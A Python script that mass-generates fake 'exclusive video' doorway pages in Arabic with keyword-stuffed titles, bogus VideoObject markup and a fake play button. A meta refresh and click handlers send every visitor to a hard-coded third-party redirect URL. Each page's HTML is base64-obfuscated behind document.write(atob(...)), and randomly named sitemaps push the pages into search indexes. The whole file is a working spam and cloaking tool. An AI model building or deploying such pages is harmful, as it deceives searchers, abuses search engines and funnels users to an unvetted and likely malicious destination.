import os
import random
import string
import re
from datetime import datetime
import base64

class UltraAggressiveSEO:
    def __init__(self):
        # مجلدات رئيسية متعددة
        self.main_folders_pool = [
            "news", "vid", "clips", "hot", "live", "viral", "update", "stream", "media", "watch", "play", "top"
        ]
        self.main_folder = random.choice(self.main_folders_pool)
        self.subfolders = ["hbcm", "video", "viral", "live"]
        self.target_sub = random.choice(self.subfolders)
        
        self.domain = self._get_domain()
        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
        
        self.keywords_ar = self._load_keywords("keywords_ar.txt")
        self.keywords_en = self._load_keywords("keywords_en.txt")
        self.keywords_in = self._load_keywords("keywords_in.txt")
        
        self.movie_template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>{{TITLE}}</title>
    <meta name="description" content="{{DESCRIPTION}}" />
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-EX63T35D79"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-EX63T35D79');
    </script>
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "{{TITLE}}",
      "description": "{{DESCRIPTION}}",
      "uploadDate": "{{TIME_ISO}}",
      "embedUrl": "{{CANONICAL_URL}}"
    }
    </script>
    <meta http-equiv="refresh" content="2; url={{REDIRECT_URL}}" />
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; direction: rtl; }
        .container { max-width: 1100px; margin: 40px auto; padding: 20px; }
        h1 { color: #e50914; }
        .player { width: 100%; height: 500px; background: #111; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 12px; }
        .watch-btn { background: #e50914; color: #fff; padding: 18px 50px; font-size: 24px; text-decoration: none; display: inline-block; margin: 25px 0; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>{{TITLE}}</h1>
        <div class="player" onclick="location.href='{{REDIRECT_URL}}'">
            <div style="font-size:100px; color:#e50914;">▶</div>
        </div>
        <a href="{{REDIRECT_URL}}" class="watch-btn">شاهد الآن بجودة عالية</a>
        <div class="desc">{{DESCRIPTION}}</div>
        <div style="margin-top:50px; text-align:right;">
            <h3>فيديوهات مقترحة</h3>
            {{INTERNAL_LINKS}}
        </div>
    </div>
</body>
</html>"""

    def _load_keywords(self, filename):
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except: return []
        return []

    def _get_domain(self):
        if os.path.exists("CNAME"):
            with open("CNAME", "r", encoding="utf-8") as f:
                return f.read().strip()
        return "static.meiguodizhi.com"

    def generate_title_and_desc(self):
        lang = random.choice(["ar", "en", "in"])
        keywords = getattr(self, f"keywords_{lang}", [])
        if not keywords: return "فيديو حصري جديد", "شاهد الآن بجودة عالية HD"
        selected = random.sample(keywords, min(len(keywords), random.randint(5, 10)))
        title = ' '.join(selected)
        return title, f"شاهد {title} الآن بجودة HD حصريًا بدون إعلانات"

    def clean_slug(self, title):
        clean = re.sub(r'[^a-zA-Z0-9\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
        slug = re.sub(r'[\s-]+', '-', clean).strip('-')
        return f"{slug[:50]}.html"

    def generate_random_name(self, length=8):
        """توليد اسم عشوائي للملفات"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def create_structured_sitemaps(self, pages, chunk_size=200):
        """ينشئ ملفات خرائط فرعية بأسماء عشوائية وملف فهرس عشوائي"""
        sitemap_files = []
        total_pages = len(pages)
        
        # تقسيم الصفحات إلى مجموعات (كل مجموعة 200)
        for i in range(0, total_pages, chunk_size):
            chunk = pages[i : i + chunk_size]
            # اسم عشوائي للملف الفرعي
            random_sitemap_name = f"{self.generate_random_name(10)}.xml"
            sitemap_files.append(random_sitemap_name)
            
            content = '<?xml version="1.0" encoding="UTF-8"?>\n'
            content += '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
            for p in chunk:
                content += f'  <url>\n    <loc>{p["url"]}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>\n'
            content += '</urlset>'
            
            with open(random_sitemap_name, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"✅ Created sub-file: {random_sitemap_name} with {len(chunk)} links.")

        # إنشاء ملف الفهرس الرئيسي باسم عشوائي
        random_index_name = f"{self.generate_random_name(12)}.xml"
        index_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
        index_content += '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        for sm in sitemap_files:
            index_content += f'  <sitemap>\n    <loc>https://{self.domain}/{sm}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n  </sitemap>\n'
        index_content += '</sitemapindex>'
        
        with open(random_index_name, "w", encoding="utf-8") as f:
            f.write(index_content)
        
        print(f"🚀 Main index file created: {random_index_name}")
        print(f"ℹ️ You should submit this link to search engines: https://{self.domain}/{random_index_name}")

    def run(self, count=200):
        # إنشاء المجلدات
        path = os.path.join(self.main_folder, self.target_sub)
        if not os.path.exists(path):
            os.makedirs(path)
        
        pages = []
        print(f"--- Starting Generation: {count} pages in {path} ---")
        
        # توليد بيانات الصفحات
        for _ in range(count):
            title, description = self.generate_title_and_desc()
            slug = self.clean_slug(title)
            pages.append({
                "title": title,
                "description": description,
                "slug": slug,
                "url": f"https://{self.domain}/{self.main_folder}/{self.target_sub}/{slug}"
            })

        current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
        
        # إنشاء ملفات HTML
        for p in pages:
            internal_sample = random.sample(pages, min(10, len(pages)))
            links_html = "".join([f'<a href="{x["url"]}" style="color:#ccc; display:block; margin:5px 0;">{x["title"]}</a>' for x in internal_sample])
            
            full_html = self.movie_template.replace("{{TITLE}}", p['title'])\
                                           .replace("{{DESCRIPTION}}", p['description'])\
                                           .replace("{{CANONICAL_URL}}", p['url'])\
                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
                                           .replace("{{TIME_ISO}}", current_time_iso)\
                                           .replace("{{INTERNAL_LINKS}}", links_html)
            
            encoded = base64.b64encode(full_html.encode('utf-8')).decode('utf-8')
            output = f'<html><body><script>document.write(atob("{encoded}"));</script></body></html>'
            
            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
                f.write(output)

        # إنشاء الملفات بأسماء عشوائية (كل واحد 200 رابط)
        self.create_structured_sitemaps(pages, chunk_size=200)

if __name__ == "__main__":
    bot = UltraAggressiveSEO()
    bot.run(count=50)
